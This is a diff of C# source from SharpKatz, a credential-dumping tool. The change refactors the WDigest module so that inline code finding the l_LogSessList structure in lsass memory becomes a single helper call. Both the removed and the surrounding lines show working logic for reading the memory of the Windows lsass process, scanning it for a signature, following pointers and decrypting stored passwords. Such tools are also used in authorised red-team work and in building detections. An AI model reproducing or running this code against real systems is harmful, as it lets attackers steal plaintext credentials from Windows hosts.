@@ -6,7 +6,7 @@ using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
 
-namespace SharpKatz
+namespace SharpKatz.Module
 {
     class WDigest
     {
@@ -44,43 +44,11 @@ namespace SharpKatz
         {
 
             KIWI_WDIGEST_LIST_ENTRY entry;
-            long logSessListSigOffset, logSessListOffset;
             IntPtr logSessListAddr;
-            IntPtr wdigestLocal;
             IntPtr llCurrent;
             string passDecrypted = "";
 
-            // Load wdigest.dll locally to avoid multiple ReadProcessMemory calls into lsass
-            wdigestLocal = Natives.LoadLibrary("wdigest.dll");
-            if (wdigestLocal == IntPtr.Zero)
-            {
-                Console.WriteLine("[x] Error: Could not load wdigest.dll into local process");
-                return 1;
-            }
-            //Console.WriteLine("[*] Loaded wdigest.dll at address {0:X}", wdigestLocal.ToInt64());
-
-            byte[] tmpbytes = new byte[max_search_size];
-            Marshal.Copy(wdigestLocal, tmpbytes, 0, (int)max_search_size);
-
-            // Search for l_LogSessList signature within wdigest.dll and grab the offset
-            logSessListSigOffset = (long)Utility.SearchPattern(tmpbytes, oshelper.logSessListSig);
-            if (logSessListSigOffset == 0)
-            {
-                Console.WriteLine("[x] Error: Could not find l_LogSessList signature\n");
-                return 1;
-            }
-            //Console.WriteLine("[*] l_LogSessList offset found as {0}", logSessListSigOffset);
-
-            // Read memory offset to l_LogSessList from a "lea reg, [l_LogSessList]" asm
-            IntPtr tmp_p = IntPtr.Add(wdigestMem, (int)logSessListSigOffset - 4);
-            byte[] logSessListOffsetBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 4);
-            logSessListOffset = BitConverter.ToInt32(logSessListOffsetBytes, 0);
-
-            // Read pointer at address to get the true memory location of l_LogSessList
-            tmp_p = IntPtr.Add(wdigestMem, (int)logSessListSigOffset + (int)logSessListOffset);
-            byte[] logSessListAddrBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 8);
-            long logSessListAddrInt = BitConverter.ToInt64(logSessListAddrBytes, 0);
-            logSessListAddr = new IntPtr(logSessListAddrInt);
+            logSessListAddr = Utility.GetListAdress(hLsass, wdigestMem, "wdigest.dll", max_search_size, -4, oshelper.logSessListSig);
 
             //Console.WriteLine("[*] l_LogSessList found at address {0:X}", logSessListAddr.ToInt64());
 
